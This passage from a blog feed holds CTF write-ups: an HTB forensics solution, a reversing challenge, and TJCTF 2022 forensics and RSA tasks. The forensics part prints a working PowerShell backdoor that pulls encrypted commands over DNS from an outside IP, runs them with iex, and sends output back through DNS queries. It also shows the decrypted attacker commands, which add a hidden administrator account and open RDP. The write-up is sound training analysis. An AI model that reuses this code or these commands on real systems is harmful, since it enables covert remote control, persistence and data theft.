class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.Text.Encoding</span>]::UTF8.GetString(<span class="variable">$unencryptedData</span>).Trim([<span class="built_in">char</span>]<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">filter</span> parts(<span class="variable">$query</span>) &#123; <span class="variable">$t</span> = <span class="variable">$_</span>; <span class="number">0</span>..[<span class="type">math</span>]::floor(<span class="variable">$t</span>.length / <span class="variable">$query</span>) | % &#123; <span class="variable">$t</span>.substring(<span class="variable">$query</span> * <span class="variable">$_</span>, [<span class="type">math</span>]::min(<span class="variable">$query</span>, <span class="variable">$t</span>.length - <span class="variable">$query</span> * <span class="variable">$_</span>)) &#125;&#125; </span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;a1E4MUtycWswTmtrMHdqdg==&quot;</span></span><br><span class="line"><span class="variable">$out</span> = <span class="built_in">Resolve-DnsName</span> <span class="literal">-type</span> TXT <span class="literal">-DnsOnly</span> windowsliveupdater.com <span class="literal">-Server</span> <span class="number">147.182</span>.<span class="number">172.189</span>|<span class="built_in">Select-Object</span> <span class="literal">-Property</span> Strings;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$num</span> = <span class="number">0</span> ; <span class="variable">$num</span> <span class="operator">-le</span> <span class="variable">$out</span>.Length<span class="literal">-2</span>; <span class="variable">$num</span>++)&#123;</span><br><span class="line"><span class="variable">$encryptedString</span> = <span class="variable">$out</span>[<span class="variable">$num</span>].Strings[<span class="number">0</span>]</span><br><span class="line"><span class="variable">$backToPlainText</span> = Decrypt<span class="literal">-String</span> <span class="variable">$key</span> <span class="variable">$encryptedString</span></span><br><span class="line"><span class="variable">$output</span> = <span class="built_in">iex</span> <span class="variable">$backToPlainText</span>;<span class="variable">$pr</span> = Encrypt<span class="literal">-String</span> <span class="variable">$key</span> <span class="variable">$output</span>|parts <span class="number">32</span></span><br><span class="line"><span class="built_in">Resolve-DnsName</span> <span class="literal">-type</span> A <span class="literal">-DnsOnly</span> start.windowsliveupdater.com <span class="literal">-Server</span> <span class="number">147.182</span>.<span class="number">172.189</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ans</span> = <span class="number">0</span>; <span class="variable">$ans</span> <span class="operator">-lt</span> <span class="variable">$pr</span>.length<span class="literal">-1</span>; <span class="variable">$ans</span>++)&#123;</span><br><span class="line"><span class="variable">$domain</span> = <span class="operator">-join</span>(<span class="variable">$pr</span>[<span class="variable">$ans</span>],<span class="string">&quot;.windowsliveupdater.com&quot;</span>)</span><br><span class="line"><span class="built_in">Resolve-DnsName</span> <span class="literal">-type</span> A <span class="literal">-DnsOnly</span> <span class="variable">$domain</span> <span class="literal">-Server</span> <span class="number">147.182</span>.<span class="number">172.189</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">Resolve-DnsName</span> <span class="literal">-type</span> A <span class="literal">-DnsOnly</span> end.windowsliveupdater.com <span class="literal">-Server</span> <span class="number">147.182</span>.<span class="number">172.189</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>that is doing an encryption and decryption using a specific key. If we change it a little bit we may get something so let’s try. First, let’s find the encrypted strings. I assumed that they can be found in the DNS packets since the script is referring to them at the end with the IP address being <code>147.182.172.189</code> . So I immediately went to Wireshark and filtered by the IP address as a source address.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F722ca024-6ee2-4122-91a8-a628b6aaaf7c%2FUntitled.png?id=89844d8e-6b6a-4b22-ac80-7373ca203fbe&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>I noticed this file which contains what it looks like a base64 encoded strings </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff586425b-3025-4fe6-882b-af32342b1931%2FUntitled.png?id=34ec40b0-643d-419d-965c-b9eac92905f6&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>I exported them and I added them in an array in the <code>encryptedString</code> variable </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$encryptedString</span> = (<span class="string">&quot;Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=&quot;</span>,<span class="string">&quot;hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=&quot;</span>,<span class="string">&quot;58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=&quot;</span>,<span class="string">&quot;eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru&quot;</span>,<span class="string">&quot;BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=&quot;</span>,<span class="string">&quot;vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=&quot;</span>,<span class="string">&quot;M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh&quot;</span>)</span><br></pre></td></tr></table></figure><p>Then I added a simple loop to go through the <code>$encryptedString</code> and decrypt each value with the <code>$key</code> </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$es</span> <span class="keyword">in</span> <span class="variable">$encryptedString</span>) &#123;</span><br><span class="line">        <span class="variable">$backToPlainText</span> = Decrypt<span class="literal">-String</span> <span class="variable">$key</span> <span class="variable">$es</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$backToPlainText</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now we have all the pieces to re-construct the script.</p><p><strong>Final script</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Create-AesManagedObject</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$IV</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$aesManaged</span> = <span class="built_in">New-Object</span> <span class="string">&quot;System.Security.Cryptography.AesManaged&quot;</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.Mode = [<span class="type">System.Security.Cryptography.CipherMode</span>]::CBC</span><br><span class="line">    <span class="variable">$aesManaged</span>.Padding = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::Zeros</span><br><span class="line">    <span class="variable">$aesManaged</span>.BlockSize = <span class="number">128</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.KeySize = <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$IV</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$IV</span>.getType().Name <span class="operator">-eq</span> <span class="string">&quot;String&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$IV</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = <span class="variable">$IV</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$key</span>.getType().Name <span class="operator">-eq</span> <span class="string">&quot;String&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$key</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = <span class="variable">$key</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$aesManaged</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt-String</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$encryptedStringWithIV</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$bytes</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$encryptedStringWithIV</span>)</span><br><span class="line">    <span class="variable">$IV</span> = <span class="variable">$bytes</span>[<span class="number">0</span><span class="type">..15</span>]</span><br><span class="line">    <span class="variable">$aesManaged</span> = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span> <span class="variable">$IV</span></span><br><span class="line">    <span class="variable">$decryptor</span> = <span class="variable">$aesManaged</span>.CreateDecryptor();</span><br><span class="line">    <span class="variable">$unencryptedData</span> = <span class="variable">$decryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">16</span>, <span class="variable">$bytes</span>.Length - <span class="number">16</span>);</span><br><span class="line">    <span class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.Text.Encoding</span>]::UTF8.GetString(<span class="variable">$unencryptedData</span>).Trim([<span class="built_in">char</span>]<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;a1E4MUtycWswTmtrMHdqdg==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$encryptedString</span> = (<span class="string">&quot;Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=&quot;</span>,<span class="string">&quot;hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=&quot;</span>,<span class="string">&quot;58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=&quot;</span>,<span class="string">&quot;eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru&quot;</span>,<span class="string">&quot;BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=&quot;</span>,<span class="string">&quot;vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=&quot;</span>,<span class="string">&quot;M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$es</span> <span class="keyword">in</span> <span class="variable">$encryptedString</span>) &#123;</span><br><span class="line">        <span class="variable">$backToPlainText</span> = Decrypt<span class="literal">-String</span> <span class="variable">$key</span> <span class="variable">$es</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$backToPlainText</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s run the script with the command <code>pwsh</code> in linux </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fef6f7aa5-2db3-4959-949c-d5f132aa57de%2FUntitled.png?id=0dc97c3a-7471-4e1d-9575-c400b6a15135&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p><strong>Output</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br><span class="line">whoami</span><br><span class="line">ipconfig</span><br><span class="line">wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value</span><br><span class="line">net user DefaultUsr <span class="string">&quot;JHBhcnQxPSdIVEJ7eTB1X2M0bl8n&quot;</span> /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup <span class="string">&quot;Remote Desktop Users&quot;</span> /add DefaultUsr</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Terminal Server&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">3389</span></span><br><span class="line">net <span class="built_in">start</span> TermService</span><br></pre></td></tr></table></figure><p>We got a base64 encoded strings <code>JHBhcnQxPSdIVEJ7eTB1X2M0bl8n</code> , let’s decode it </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ffef5046e-cc5b-4ef8-81bb-1618eb8c070a%2FUntitled.png?id=e2bbef00-c01e-404e-b346-e7d73721936a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1090&userId=&cache=v2" alt="forensics"></p><p>We found the first part of the flag</p><p><code>$part1=&#39;HTB&#123;y0u_c4n_&#39;</code> </p><p>Let’s now look for the second part. </p><p>Going back to the DNS packets in the capture I noticed that there are hex values appended to the domain name.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fdc6794b3-d881-4391-b743-d920a18471d5%2FUntitled.png?id=cd582a4b-71e8-4577-8ca5-3562e9885d19&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>I went through all the DNS packets that have those hex values and extracted them. By doing so I got the following value </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F63a58d92-5d6c-4f34-a4b8-746a134e26b1%2FUntitled.png?id=3027fba5-b876-4b3a-bf49-2cfb8f9de869&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>Now how can we decode this ?</p><p>It’s so simple , we know the type of the encryption being used which is <code>AES</code> , we also know the IV which is the first 16 bytes of our hex value according to the script</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">`function Decrypt<span class="literal">-String</span>(<span class="variable">$key</span>, <span class="variable">$encryptedStringWithIV</span>) &#123;</span><br><span class="line">    <span class="variable">$bytes</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$encryptedStringWithIV</span>)</span><br><span class="line">    <span class="variable">$IV</span> = <span class="variable">$bytes</span>[<span class="number">0</span><span class="type">..15</span>]</span><br><span class="line">    <span class="variable">$aesManaged</span> = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span> <span class="variable">$IV</span></span><br><span class="line">    <span class="variable">$decryptor</span> = <span class="variable">$aesManaged</span>.CreateDecryptor();</span><br><span class="line">    <span class="variable">$unencryptedData</span> = <span class="variable">$decryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">16</span>, <span class="variable">$bytes</span>.Length - <span class="number">16</span>);</span><br><span class="line">    <span class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.Text.Encoding</span>]::UTF8.GetString(<span class="variable">$unencryptedData</span>).Trim([<span class="built_in">char</span>]<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IV</span> = CC1C9AC2958A2E63609272E2B4F8F436</span><br></pre></td></tr></table></figure><p>We know the key being used to encrypt which is </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="string">&quot;a1E4MUtycWswTmtrMHdqdg==&quot;</span></span><br></pre></td></tr></table></figure><p>Let’s throw everything into <strong>Cyberchef</strong> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F96d88494-7a8f-49ec-a423-0cb994128237%2FUntitled.png?id=57b6d822-aa91-4730-a37a-7b8ede795f13&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>And there we go , we got our second part of the flag.</p><p><code>$part2=4utom4t3_but_y0u_c4nt_h1de&#125;</code></p><p><strong>Full flag :</strong></p><p><code>HTB&#123;y0u_c4n_4utom4t3_but_y0u_c4nt_h1de&#125;</code></p><hr><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a><strong>Conclusion</strong></h2><p>I really liked the forensics challenges, they are really high quality. I learnt a lot of new things in the process of solving them. Kudos to the author.</p><hr><h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="Omega-One"><a href="#Omega-One" class="headerlink" title="Omega One"></a><strong>Omega One</strong></h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You&#x27;ve been sent to the library planet Omega-One. Here, records from all over the galaxy are collected, sorted and archived with perfect efficiency. You need to retrieve records about Draeger&#x27;s childhood, but the interface is impossibly large. Can you unravel the storage system?</span><br></pre></td></tr></table></figure><p>We are given a binary file and an output.txt file </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1656544a-9c4b-41d5-b93f-69aee6f7e459%2FUntitled.png?id=72ae14e6-ba85-457d-927d-793db51ec972&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=530&userId=&cache=v2" alt="Untitled"></p><p><strong>omega-one binary</strong> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fcd26ef2c-bf96-4380-8033-2b5b3b88207a%2FUntitled.png?id=96762800-8422-4fd4-9614-2b840f795533&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="reversing"></p><p>This is the content of the <strong>output.txt</strong> file </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe489af28-d549-4493-8fd6-5907f73f5752%2FUntitled.png?id=3c4d62f2-a540-4e34-883d-cd02c1d9efcc&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1390&userId=&cache=v2" alt="reversing"></p><p>Let’s open the binary in IDA and take a look at it.</p><p>This is the decompiled code for the <strong>main</strong> function </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F346b3c0c-5ebd-4290-a39f-00945f94f5a8%2FUntitled.png?id=6d5e5509-4163-43cf-88ce-c2a1272fad44&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1700&userId=&cache=v2" alt="reversing"></p><p>If we take a look at it we notice that there are characters that map to some words. </p><p>After spending sometime reading through different functions , I noticed something, If we look at the names in output.txt file we can find that the first 4 names map to the characters H,T,B and { respectively which is the beginning of the flag. </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F71182384-0d6d-46bc-bde7-db4dc054456c%2FUntitled.png?id=3dd5a756-2d70-4daa-998a-fd61c7df90cc&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1210&userId=&cache=v2" alt="reversing"></p><p>I did go through all the main function and assigned each name in output.txt with the corresponding character. The result was</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbf90fcd3-a111-4ae8-8616-3d478a5877ca%2FUntitled.png?id=468ff1a5-7071-40f7-acc7-ed1ab4a0386b&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1020&userId=&cache=v2" alt="reversing"></p><p><code>Flag : HTB&#123;l1n34r_t1m3_but_pr3tty_sl0w!&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> HTB </tag>
            
            <tag> forensics </tag>
            
            <tag> reversing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TJCTF 2022 Writeups</title>
      <link href="/2022/05/15/TJCTF-2022-Writeups/"/>
      <url>/2022/05/15/TJCTF-2022-Writeups/</url>
      
        <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="fake-geoguessr"><a href="#fake-geoguessr" class="headerlink" title="fake-geoguessr"></a><strong>fake-geoguessr</strong></h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We don&#x27;t do guess challs here at TJCTF, so that means no Geoguessr 😞 Since I took this photo myself, though, you can find out precisely where it was taken, and some Bonus Content™️, from my Camera Model Name to the Circle Of Confusion. Maybe you&#x27;ll find a flag there?</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ exiftool lake.jpg                                     </span><br><span class="line">ExifTool Version Number         : 12.41</span><br><span class="line">File Name                       : lake.jpg</span><br><span class="line">[REDACTED]</span><br><span class="line">Copyright                       : tjctf&#123;thats_a_</span><br><span class="line">Exposure Time                   : 1/520</span><br><span class="line">F Number                        : 2.2</span><br><span class="line">Exposure Program                : Program AE</span><br><span class="line">ISO                             : 32</span><br><span class="line">...................................................................</span><br><span class="line">[REDACTED]</span><br><span class="line">Application Record Version      : 4</span><br><span class="line">IPTC Digest                     : b443520a10119da99c2550175e6d0efb</span><br><span class="line">Comment                         : lot_of_metadata&#125;</span><br><span class="line">[REDACTED]</span><br><span class="line">...................................................................</span><br></pre></td></tr></table></figure><p><code>Flag : tjctf&#123;thats_a_lot_of_metadata&#125;</code></p><h2 id="cool-school"><a href="#cool-school" class="headerlink" title="cool-school"></a><strong>cool-school</strong></h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wow TJ is such a cool school! This image really captures the vibes. But something seems off about the image...</span><br></pre></td></tr></table></figure><p>I used <strong>StegSolve</strong> for this challenge</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb58b076f-d397-4e69-96f3-2ea6285fb1a7%2FUntitled.png?id=d9a7c0fe-2d28-4b03-b5ca-d9ccf284840c&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : tjctf&#123;lol_st3g_s0_co0l&#125;</code></p><h2 id="spongebob"><a href="#spongebob" class="headerlink" title="spongebob"></a><strong>spongebob</strong></h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TJCTF is really cool and spongebob thinks so too. So cool in fact...wait a minute, isn&#x27;t the meme usually 4 squares???</span><br></pre></td></tr></table></figure><p>Using <strong>TweakPNG</strong> software we change the Height of the image to 1000 or any big value and save the changes.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4d638b2b-f084-4b82-bfa8-4f44d3c0f1b1%2FUntitled.png?id=a9165233-8f32-4994-aa13-dbd392f005e4&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1360&userId=&cache=v2" alt="forensics"></p><p>We open the image again and we get our flag </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F99eab2ad-09b9-43c7-ab54-33093f844b50%2Fimage.png?id=8b839fe9-d76f-497e-aafa-196cbc99eb51&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=440&userId=&cache=v2" alt="image.png"></p><p><code>Flag : tjctf&#123;such_pogg3rs_ctf&#125;</code> </p><h2 id="sneaker-zipper"><a href="#sneaker-zipper" class="headerlink" title="sneaker-zipper"></a><strong>sneaker-zipper</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sometimes the zippers can be sneaky...</span><br></pre></td></tr></table></figure><p>For this challenge I unzipped the chall.zip file using <strong>CyberChef</strong> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6d33bd33-2133-4033-aa46-6ba1efd39272%2FUntitled.png?id=021d072e-01a1-4ef4-a756-6b001ddbd43b&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>Then I saved the output as a text file , when I opened it I found the flag.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F8c789ff5-adc4-4250-a456-7b35cd8bfe3b%2FUntitled.png?id=8a0f7ef4-e354-4cc3-bcb1-fa9f848b672f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1910&userId=&cache=v2" alt="forensics"></p><p><code>Flag : tjctf&#123;sneakers_with_zippers_are_hip_no?_874d174bb26fcf95&#125;</code></p><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rsa-apprentice"><a href="#rsa-apprentice" class="headerlink" title="rsa-apprentice"></a><strong>rsa-apprentice</strong></h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My friend sent me this secret message but I can&#x27;t figure out how to decrypt it! Can you help?</span><br></pre></td></tr></table></figure><p>We are given a problem.txt file which contains our RSA numbers </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">==== SECRET RSA MESSAGE ====</span><br><span class="line">n = 1216177716507739302616478655910148392804849</span><br><span 